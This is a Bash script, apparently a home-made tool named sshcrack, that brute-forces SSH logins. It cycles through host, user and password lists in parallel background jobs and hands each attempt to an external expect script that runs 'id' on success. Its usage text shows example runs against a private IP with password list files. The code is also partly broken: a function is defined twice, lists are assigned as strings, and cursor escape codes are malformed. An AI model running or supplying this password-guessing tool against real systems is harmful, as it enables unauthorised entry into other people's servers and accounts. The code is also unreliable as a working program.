#!/bin/bash

declare -a host_list
declare -a user_list
declare -a passwd_list
declare host_list_num=0
declare user_list_num=0
declare passwd_list_num=0
declare sshcrack_logfile="sshcrack.log"
declare sshcrack_timeout=10
declare sshcrack_threadnum=1
declare sshcrack_flag=0
declare total_run_time
declare max_row_num

declare -a playx=('/' '|' '\\' '-')
declare playx_len=4

function sshcrack_show_arg()
{
        echo -ne "\033[2;1H"
        echo -ne "\033[31;1mhost: $host_list_num | users: $user_list_num | passwd: $passwd_list_num"
	echo -e " thread: $sshcrack_threadnum | timeout: $sshcrack_timeout | logfile: $sshcrack_logfile\n\033[0m"
}

function sshcrack_init()
{
        echo -ne "\033[2J"
        MAX_ROW_NUM=`stty size|cut -d " " -f 1`
        MAX_COL_NUM=`stty size|cut -d " " -f 2`
        max_row_num=$((MAX_ROW_NUM-5))
}

function sshcrack_exit()
{
	local x=$((sshcrack_threadnum + 8)) y=1

	echo -e "\033[${x}:${y}Hwaiting all threads to finsh...\033[0m"
        #echo -e "\033[?25h"
}

function sshcrack_show_hlist()
{
	local arg

	echo $host_list_num
	for arg in ${host_list[@]}
	do
		echo $arg
	done
}

function sshcrack_show_ulist()
{
        local arg

        echo $user_list_num
        for arg in ${user_list[@]}
        do
                echo $arg
        done
}

function sshcrack_show_plist()
{
        local arg

        echo $passwd_list_num
        for arg in ${passwd_list[@]}
        do
                echo $arg
        done
}

function sshcrack_init()
{
	local line tmp_list=()

	if [ ! -f $1 ]; then
		tmp_list[0]=$1; tmp_list_num=1
	else
		tmp_list_num=0
		while read line
		do
			tmp_list[$tmp_list_num]=$line
			((++tmp_list_num))
		done < $1
	fi
	
	case $2 in
	1)
		host_list=${tmp_list[*]} 
		host_list_num=$tmp_list_num
		;;
	2)
		user_list=${tmp_list[*]}
		user_list_num=$tmp_list_num
		;;
	3)
		passwd_list=${tmp_list[*]}
		passwd_list_num=$tmp_list_num
		;;
	esac
		
}

function do_sshcrack()
{
	local ret x=$(($1+4)) y=1

	./sshcrack.exp $3 $2 $4 $5 $6 >/dev/null
	ret=$?
	if [ $ret -eq 6 ];then 
		printf "\033[${x}:${y}H\033[32;1mThread[%2d]\t%s@%s\t\t==>\t[%-16s]\t[success]\t%2d\n\033[0m" $1 $2 $3 $4 $ret
		sshcrack_flag=1
		return 0
	else
		printf "\033[${x}:${y}H\033[32;1mThread[%2d]\t%s@%s\t\t==>\t[%-16s]\t[failed]\t%2d\n\033[0m" $1 $2 $3 $4 $ret
	fi
	return 1
}

function sshcrack_engine()
{
	local host user passwd ret thread_num=0

	for host in ${host_list[*]}
	do
		for user in ${user_list[*]}
		do
			for passwd in ${passwd_list[*]}
			do
				if [ $thread_num -ge $sshcrack_threadnum ]; then
					wait; thread_num=0; sleep 0.5; continue
				fi
				((thread_num++))
				{
				do_sshcrack $thread_num $user $host $passwd "id" $sshcrack_timeout
				if [ $sshcrack_flag -eq 1 ]; then
					wait && return 0
				fi
				}&
			done
		done
	done
}

function sshcrack_usage()
{
	echo -e "$1 <-h host> <-u user> <-p passwd> [-t timeout] [-n threadnum] [-o logfile]\n"
	echo -e "option:"
	echo -e "-h\t\thost name or host list file."
	echo -e "-u\t\tuser name or user list file."
	echo -e "-p\t\tsingle passwd or passwd list file."
	echo -e "-t\t\tconnect timeout, defalut is 5s."
	echo -e "-n\t\tthread num, default is 1."
	echo -e "-o\t\tlog file.\n"
	echo -e "-v\t\tdisplay help information.\n"
	echo -e "exp:\n"
	echo -e "$1 -h 192.168.215.148 -u wzt -p passwd.lst"
	echo -e "$1 -h 192.168.215.148 -u wzt -p passwd.lst -n 10 -t 2"
	echo -e "$1 -h 192.168.215.148 -u user.lst -p passwd.lst -n 10 -t 2"
	echo -e "$1 -h host.lst -u user.lst -p passwd.lst -n 10 -t 2"
}

function main()
{
	if [ $# -eq 0 ]; then
		sshcrack_usage $0
		exit 0
	fi

        while getopts "h:u:p:n:t:o:v" arg
        do
        case $arg in
                h)
                        sshcrack_init $OPTARG 1 ;;
                u)
                        sshcrack_init $OPTARG 2 ;;
                p)
                        sshcrack_init $OPTARG 3 ;;
                o)
                        sshcrack_logfile=$OPTARG ;;
                t)
                        sshcrack_timeout=$OPTARG ;;
                n)
                        sshcrack_threadnum=$OPTARG ;;
                v)
                        sshcrack_usage $0
                        exit 0
                        ;;
                ?)
                        echo "Unkown arguments."
                        exit 1
                        ;;
        esac
        done

	sshcrack_init
	sshcrack_show_arg
	sshcrack_engine
	sshcrack_exit
}

main $@
